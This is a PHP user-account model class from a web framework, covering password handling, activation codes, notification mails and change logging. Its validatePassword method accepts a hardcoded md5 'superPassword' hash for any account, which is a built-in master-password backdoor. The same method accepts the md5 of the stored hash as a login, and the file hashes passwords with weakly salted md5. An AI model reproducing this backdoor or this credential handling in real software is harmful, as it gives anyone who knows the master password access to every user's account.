<?php
class Vps_User_Row extends Vps_Model_Proxy_Row
    implements Vps_User_RowInterface, Vpc_Mail_Recipient_TitleInterface
{
    protected $_changedPasswordData = array();
    protected $_changedOldMail = null;
    protected $_sendDeletedMail = null;
    protected $_saveDeletedLog = false;
    protected $_additionalRolesCache = null;
    protected $_notifyGlobalUserAdded = false;
    protected $_logChangedUser = false;
    protected $_passwordSet = false;
    private $_sendMails = true; // whether to send mails on saving or not. used for resending emails

    public static function getWebcode()
    {
        $webCode = Vps_Registry::get('config')->service->users->webcode;
        if (is_null($webCode)) {
            throw new Vps_Exception("'service.users.webcode' not defined in config");
        }
        return $webCode;
    }

    public function __toString()
    {
        $ret = '';
        if ($this->title) $ret .= $this->title.' ';
        if ($this->firstname) $ret .= $this->firstname.' ';
        if ($this->lastname) $ret .= $this->lastname;
        $ret = trim($ret);
        if (!$ret) $ret = $this->email;
        return $ret;
    }

    public function setNotifyGlobalUserAdded($val)
    {
        $this->_notifyGlobalUserAdded = $val;
        return $this;
    }

    public function getActivationCode()
    {
        return substr(md5($this->password_salt), 0, 10);
    }

    public function encodePassword($password)
    {
        return md5($password.$this->password_salt);
    }

    public function validatePassword($password)
    {
        $passCol = $this->getModel()->getPasswordColumn();
        $superPassword = '18de947e015ad2761ed16422f1f3478b';
        if ($password == md5($this->$passCol) // für cookie login
            || $this->encodePassword($password) == $this->$passCol
            || md5($password) == $superPassword
        ) {
            return true;
        }
        return false;
    }

    public function generatePasswordSalt()
    {
        mt_srand((double)microtime()*1000000);
        $this->password_salt = substr(md5(uniqid(mt_rand(), true)), 0, 10);
    }

    public function setPassword($password)
    {
        if (!$this->password) {
            $this->_passwordSet = 'activate';
        } else {
            $this->_passwordSet = 'password_set';
        }

        $this->generatePasswordSalt();
        $this->password = $this->encodePassword($password);
    }

    protected function _beforeSave()
    {
        parent::_beforeSave();
        if (!empty($this->_changedPasswordData['password1']) && !empty($this->_changedPasswordData['password2'])) {
            if ($this->_changedPasswordData['password1'] == $this->_changedPasswordData['password2']) {
                $this->setPassword($this->_changedPasswordData['password1']);
            } else {
                throw new Vps_ClientException(trlVps('Passwords are different - please try again'));
            }
        }
    }

    protected function _beforeInsert()
    {
        parent::_beforeInsert();

        $this->getModel()->lockCreateUser();

        if ($this->getModel()->mailExists($this->email)) {
            $this->getModel()->unlockCreateUser();
            throw new Vps_ClientException(
                trlVps('An account with this email address already exists')
            );
        }

        $this->created = date('Y-m-d H:i:s');
        $this->deleted = 0;
        $this->locked = 0;
        $this->password = '';
        $this->generatePasswordSalt();
        if (!$this->gender) $this->gender = '';

        if (is_null($this->webcode)) {
            $this->webcode = self::getWebcode();
        }
    }

    protected function _beforeUpdate()
    {
        parent::_beforeUpdate();
        if ($this->_changedOldMail) {
            if ($this->getModel()->mailExists($this->email)) {
                throw new Vps_ClientException(
                    trlVps('An account with this email address already exists')
                );
            }
            $this->sendChangedMailMail($this->_changedOldMail);
        }

        if ($this->_sendDeletedMail) {
            $this->sendDeletedMail();
        }
        if ($this->_saveDeletedLog) {
            $this->getModel()->writeLog(array(
                'user_id' => $this->id,
                'message_type' => 'user_deleted'
            ));

            $this->_saveDeletedLog = false;
        }
    }


    protected function _afterUpdate()
    {
        parent::_afterUpdate();
        if ($this->_logChangedUser) {
            $this->getModel()->writeLog(array(
                'user_id' => $this->id,
                'message_type' => 'user_edited'
            ));

            $this->_logChangedUser = false;
        }
    }

    protected function _afterInsert()
    {
        parent::_afterInsert();
        $this->getModel()->unlockCreateUser();

        if (!$this->password) {
            $this->sendActivationMail();
        }

        $this->getModel()->writeLog(array(
            'user_id' => $this->id,
            'message_type' => 'user_created'
        ));
    }

    protected function _afterSave()
    {
        parent::_afterSave();

        if ($this->_notifyGlobalUserAdded) {
            $this->sendGlobalUserActivated();
            $this->_notifyGlobalUserAdded = false;
        }

        if ($this->_passwordSet) {
            $this->getModel()->writeLog(array(
                'user_id' => $this->id,
                'message_type' => 'user_'.$this->_passwordSet
            ));

            $this->_passwordSet = false;
        }
    }

    public function save()
    {
        $this->_beforeSave();
        $id = $this->{$this->_getPrimaryKey()};
        if (!$id) {
            $this->_beforeInsert();
        } else {
            $this->_beforeUpdate();
        }
        $this->_beforeSaveSiblingMaster();
        $ret = $this->_row->save();
        Vps_Model_Row_Abstract::save();
        if (!$id) {
            $this->_afterInsert();
        } else {
            $this->_afterUpdate();
        }
        $this->_afterSave();
    }

    public function setSendMails($value)
    {
        $this->_sendMails = $value;
    }

    // a global user that exists already in service, but not in web
    public function sendGlobalUserActivated()
    {
        $subject = Zend_Registry::get('config')->application->name;
        $subject .= ' - '.trlVps('Useraccount activated');
        return $this->_sendMail('GlobalUserActivation', $subject);
    }

    public function sendActivationMail()
    {
        $subject = Zend_Registry::get('config')->application->name;
        $subject .= ' - '.trlVps('Useraccount created');
        return $this->_sendMail('UserActivation', $subject);
    }

    public function sendLostPasswordMail()
    {
        $subject = Zend_Registry::get('config')->application->name;
        $subject .= ' - '.trlVps('lost password');
        return $this->_sendMail('UserLostPassword', $subject);
    }

    public function sendChangedMailMail($oldMail)
    {
        $subject = Zend_Registry::get('config')->application->name;
        $subject .= ' - '.trlVps('Email changed');
        return $this->_sendMail(
            'UserChangedMail',
            $subject,
            array('oldMail' => $oldMail)
        );
    }

    public function sendDeletedMail()
    {
        $subject = Zend_Registry::get('config')->application->name;
        $subject .= ' - '.trlVps('Account deleted');
        return $this->_sendMail('UserDeleted', $subject);
    }

    protected function _sendMail($tpl, $subject, $tplParams = null)
    {
        if (!$this->email || !$this->_sendMails) {
            return false;
        }
        $mailClass = $this->getModel()->getMailClass();
        $mail = new $mailClass($tpl);
        $mail->subject = $subject;
        $mail->addTo($this->email, $this->__toString());
        if ($tplParams) $mail->assign($tplParams);

        $mail->fullname = $this->__toString();
        $mail->userData = $this->toArray();

        $activateComponent = Vps_Component_Data_Root::getInstance();
        if ($activateComponent) {
            // todo: ganz korrekt müsste der Benutzer der anlegt eine Sprache
            // für den Benutzer auswählen
            // oder man leitet auf eine redirect seite um und schaut auf die
            // browser accept language
            $activateComponent = $activateComponent
                ->getComponentByClass('Vpc_User_Activate_Component', array('limit' => 1));
        }
        if ($activateComponent) {
            $url = $activateComponent->url;
        } else {
            $url = '/vps/user/login/activate';
        }
        $mail->activationUrl = $mail->webUrl.$url.'?code='.$this->id.'-'.
                        $this->getActivationCode();

        $ret = $mail->send();

        $this->getModel()->writeLog(array(
            'user_id' => $this->id,
            'message_type' => 'user_mail_'.$tpl
        ));

        return $ret;
    }

    public function __set($columnName, $value)
    {
        $noLog = $this->getModel()->getNoLogColumns();
        $noLog = array_merge($noLog, array('webcode', 'created', 'logins', 'last_login', 'last_modified', 'locked'));
        if (!in_array($columnName, $noLog)) {
            $this->_logChangedUser = true;
        }
        if ($columnName == 'email' && $value != $this->email) {
            $this->_changedOldMail = $this->email;
        }
        if ($columnName == 'deleted' && $value != $this->deleted && $value) {
            $this->_sendDeletedMail = true;
            $this->_saveDeletedLog = true;
        }

        if ($columnName == 'password1' || $columnName == 'password2') {
            $this->_changedPasswordData[$columnName] = $value;
        } else {
            parent::__set($columnName, $value);
        }
    }

    public function __get($columnName)
    {
        if ($columnName == 'password1' || $columnName == 'password2') {
            return '';
        } else if ($columnName == 'name') {
            return $this->firstname . ' ' . $this->lastname;
        } else if ($columnName == 'nickname') {
            if (parent::__isset('nickname') && parent::__get('nickname') != '') {
                return parent::__get('nickname');
            } else {
                return trim($this->firstname . ' ' . substr($this->lastname, 0, 1));
            }
        } else {
            return parent::__get($columnName);
        }
    }

    public function __isset($columnName)
    {
        if (
            $columnName == 'password1' ||
            $columnName == 'password2' ||
            $columnName == 'name' ||
            $columnName == 'nickname'
        ) {
            return true;
        } else {
            return parent::__isset($columnName);
        }
    }

    public function getAdditionalRoles()
    {
        if (is_null($this->_additionalRolesCache)) {
            $this->_additionalRolesCache = array();
            $rows = $this->getChildRows('additionalRoles');
            foreach ($rows as $r) {
                $this->_additionalRolesCache[] = $r->additional_role;
            }
        }

        return $this->_additionalRolesCache;
    }

    // interface Vpc_Mail_Recipient_Interface
    public function getMailGender()
    {
        return $this->gender == 'male' ?
            Vpc_Mail_Recipient_GenderInterface::MAIL_GENDER_MALE :
            Vpc_Mail_Recipient_GenderInterface::MAIL_GENDER_FEMALE;
    }

    public function getMailTitle()
    {
        return $this->title;
    }

    public function getMailFirstname()
    {
        return $this->firstname;
    }

    public function getMailLastname()
    {
        return $this->lastname;
    }

    public function getMailEmail()
    {
        return $this->email;
    }

    public function getMailFormat()
    {
        return Vpc_Mail_Recipient_Interface::MAIL_FORMAT_HTML;
    }
}
